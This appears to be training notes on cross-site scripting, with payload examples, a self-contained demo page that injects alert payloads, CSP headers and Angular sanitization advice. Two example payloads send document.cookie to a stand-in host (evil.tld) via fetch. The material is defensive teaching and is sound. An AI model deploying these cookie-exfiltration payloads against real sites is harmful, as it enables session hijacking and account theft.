# XXS

---

## ✅ What you're already doing:

You’ve simulated this XSS:

```js
const script = document.createElement("script");
script.innerHTML = payload;
document.body.appendChild(script);
```

This mimics a typical attack scenario. But if attackers can inject HTML, they can do much more — and some of it **doesn’t look like script at all**.

---

## Common XSS Vectors (No `<script>` Needed)

### 1. `<img src onerror>`

Classic payload:

```html
<img src="x" onerror="alert('XSS')">
```

Encoded:
```text
%3Cimg%20src%3D%22x%22%20onerror%3D%22alert('XSS')%22%3E
```

**Why it works**: When the image fails to load, the `onerror` handler is triggered.


### 2. `<iframe src="javascript:...">`

```html
<iframe src="javascript:alert('XSS')"></iframe>
```

`javascript:` URIs can execute code directly. Most modern browsers block this in many contexts, but it's still a known vector.

---

### 3. `javascript:` inside `href`

```html
<a href="javascript:alert('XSS')">Click me</a>
```

Used when attackers can inject clickable links — often used in phishing-style attacks.

---

### 4. `style` attributes with `expression()` (in IE)

```html
<div style="width: expression(alert('XSS'));">
```

IE-only but historically dangerous. Mostly obsolete, but good to be aware of.

---

### 5. `on*` attributes on any element

```html
<div onclick="alert('XSS')">Click here</div>
<input onfocus="alert('XSS')" autofocus>
```

The `on*` attributes (`onload`, `onmouseover`, `onfocus`, etc.) **are dangerous anywhere** HTML is inserted without sanitization.

---

## Realistic Attack Examples

**Image tag + exfiltration**:

```html
<img src="x" onerror="fetch('https://evil.tld?data='+document.cookie)">
```

**Link injection**:

```html
<a href="javascript:fetch('https://evil.tld?data='+document.cookie)">Click me</a>
```

---

## What You Must Do to Protect

| Protection | How it Helps |
|------------|--------------|
| ✅ **Escape all untrusted input** | Prevents HTML injection |
| ✅ **Never use `innerHTML` with untrusted data** | Only use `textContent`, `innerText`, or `safe templating` |
| ✅ **Use a strong Content Security Policy (CSP)** | Blocks inline scripts, event attributes, etc. |
| ✅ **Use libraries like [DOMPurify](https://github.com/cure53/DOMPurify)** | Sanitizes HTML safely |
| ✅ **Frameworks like Angular, React escape by default** | But can still be bypassed via `dangerouslySetInnerHTML`, etc. |
| ✅ **Disable unsafe browser features** | Like `javascript:` URIs, `data:` URIs in CSP |
| ✅ **Don’t trust query strings, cookies, or POST data** | Validate and sanitize every source |

---

## Best CSP to Start With

Set this HTTP header (server-side):

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'
```

Blocks:
- Inline scripts
- `<script>` tags
- `javascript:` URLs
- Scripts from other origins

[CSP Cheat Sheet – OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)

---

## Demo

Awesome! Here's a **1-page self-contained HTML file** you can use for **training and demos**. It contains:

- ✅ Common XSS attack vectors
- ✅ What each attack does
- ✅ How to mitigate it
- ✅ A **safe version** of handling user input

---

### ✅ XSS Demo & Defense Cheat Sheet (copy-paste to test locally)

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>XSS Attack Vectors & Defenses</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    body { font-family: sans-serif; padding: 2rem; line-height: 1.5; }
    h1 { color: darkred; }
    code, pre { background: #f4f4f4; padding: 0.2rem 0.5rem; display: block; margin: 0.5rem 0; white-space: pre-wrap; }
    .attack { border-left: 4px solid red; padding-left: 1rem; margin-bottom: 2rem; }
    .defense { border-left: 4px solid green; padding-left: 1rem; margin-bottom: 2rem; }
  </style>
</head>
<body>
  <h1>🚨 XSS Attack Vectors & Defenses</h1>

  <div class="attack">
    <h2>1. Classic &lt;script&gt; Injection (does NOT run via innerHTML)</h2>
    <pre>&lt;script&gt;alert('XSS')&lt;/script&gt;</pre>
    <strong>Modern browsers block this if inserted via innerHTML.</strong>
  </div>

  <div class="attack">
    <h2>2. Image tag with onerror</h2>
    <pre>&lt;img src="x" onerror="alert('XSS')"&gt;</pre>
    <button onclick="attack_div.innerHTML='<img src=x onerror=alert(`XSS`)>'">Run Attack</button>
  </div>

  <div class="attack">
    <h2>3. SVG tag with onload</h2>
    <pre>&lt;svg onload="alert('XSS')"&gt;&lt;/svg&gt;</pre>
    <button onclick="attack_div.innerHTML='<svg onload=alert(`XSS`)></svg>'">Run Attack</button>
  </div>

  <div class="attack">
    <h2>4. JavaScript URI in anchor</h2>
    <pre>&lt;a href="javascript:alert('XSS')"&gt;Click Me&lt;/a&gt;</pre>
    <button onclick="attack_div.innerHTML='<a href=`javascript:alert(\\'XSS\\')`>Click</a>'">Run Attack</button>
  </div>

  <div class="attack">
    <h2>5. Event handler injection</h2>
    <pre>&lt;div onclick="alert('XSS')"&gt;Click me&lt;/div&gt;</pre>
    <button onclick="attack_div.innerHTML='<div onclick=alert(`XSS`)>Click me</div>'">Run Attack</button>
  </div>

  <div class="defense">
    <h2>✅ Safe Version: Escape input with textContent</h2>
    <pre>element.textContent = userInput;</pre>
    <input id="safeInput" placeholder="Type &lt;script&gt;alert('XSS')&lt;/script&gt;" />
    <button onclick="safe_div.textContent = safeInput.value">Render Safely</button>
    <div id="safe_div" style="padding: 0.5rem; background: #eee;"></div>
  </div>

  <div class="defense">
    <h2>✅ Strong Content Security Policy (CSP)</h2>
    <pre>Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';</pre>
    <p>Use CSP headers to block inline scripts, `javascript:` URLs, and scripts from other origins.</p>
  </div>

  <hr />
  <h2>🧪 Output Area</h2>
  <div id="attack_div" style="padding: 1rem; background: #fefefe; border: 1px solid #ccc;"></div>
</body>
</html>
```

---

## How to Use This for Training

- Save it as `xss-demo.html`
- Open in any browser
- Let team members try each attack button
- Use Developer Tools to inspect what executes
- Discuss:
  - Why `innerHTML` is dangerous
  - Why `textContent` is safe
  - How CSP helps prevent inline/external script execution

---

## Bonus: Add This Header to Your Real App for CSP

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none';
```

This helps block:
- Inline scripts
- `javascript:` links
- Third-party script injection

## Angular Protection

Excellent question — this one gets to the heart of **Angular’s security model**. Let’s break it down:

---

## ✅ Is it true that **“Angular protects against XSS by default”?**

Angular **does protect you against most XSS attacks by default**, but **not in all scenarios**. There are cases where you're **on your own**, especially if you bypass Angular's built-in sanitization.

---

## What Angular protects by default

### 1. **Text/Attribute Bindings**
Angular automatically escapes values in templates when used with **interpolation** or **attribute bindings**.

#### Example:
```html
<!-- Safe: Angular escapes this -->
<p>{{ userInput }}</p>

<!-- Also safe: -->
<img [src]="userImageUrl">
```

Even if `userInput = "<script>alert('XSS')</script>"`, Angular **renders it as plain text**, not executable code.

---

### 2. **[property] bindings (with security context)**

Angular knows the security context of common DOM properties (e.g. `src`, `href`, `title`) and **sanitizes them accordingly**.

```html
<a [href]="userProvidedUrl"></a>
```

If the user tries to inject something like `javascript:alert(1)`, Angular sanitizes it and removes the unsafe content.

---

## Where Angular does **NOT** protect you

### 1. `[innerHTML]` binding
Angular will **sanitize basic HTML**, but attackers can still inject **unsafe payloads** using tricks (e.g., `<img onerror=...>`).

```html
<div [innerHTML]="userContent"></div> <!-- 🔥 Risky -->
```

Angular sanitizes:
- `<script>` tags removed
- `<img onerror=...>` may still run in some versions
- `javascript:` URLs sometimes pass unless context-aware

> Angular uses the **DomSanitizer** internally for this, but it’s limited.

---

### 2. `bypassSecurityTrustHtml()`, `bypassSecurityTrustUrl()` etc.

If you **explicitly bypass Angular’s sanitization**, you take full responsibility.

```ts
import { DomSanitizer } from '@angular/platform-browser';

this.dangerousHtml = this.sanitizer.bypassSecurityTrustHtml(userInput);
```

> At this point, **Angular is no longer protecting you**.

This is how **most real XSS vulnerabilities in Angular apps happen** — **by bypassing Angular's built-in DOM sanitization**.

---

### 3. Manually calling `element.innerHTML = ...` in code

If you manipulate the DOM directly like this:

```ts
document.getElementById('someDiv').innerHTML = userInput;
```

Angular **cannot protect you** — you’ve bypassed the framework.


## How to Stay Safe

1. Use Angular bindings and interpolation
2. Never use `bypassSecurityTrust...()` unless you **100% trust** the content
3. Avoid `[innerHTML]` if possible — or sanitize with [`DOMPurify`](https://github.com/cure53/DOMPurify)
4. Consider a Content Security Policy (CSP) as a second line of defense

---
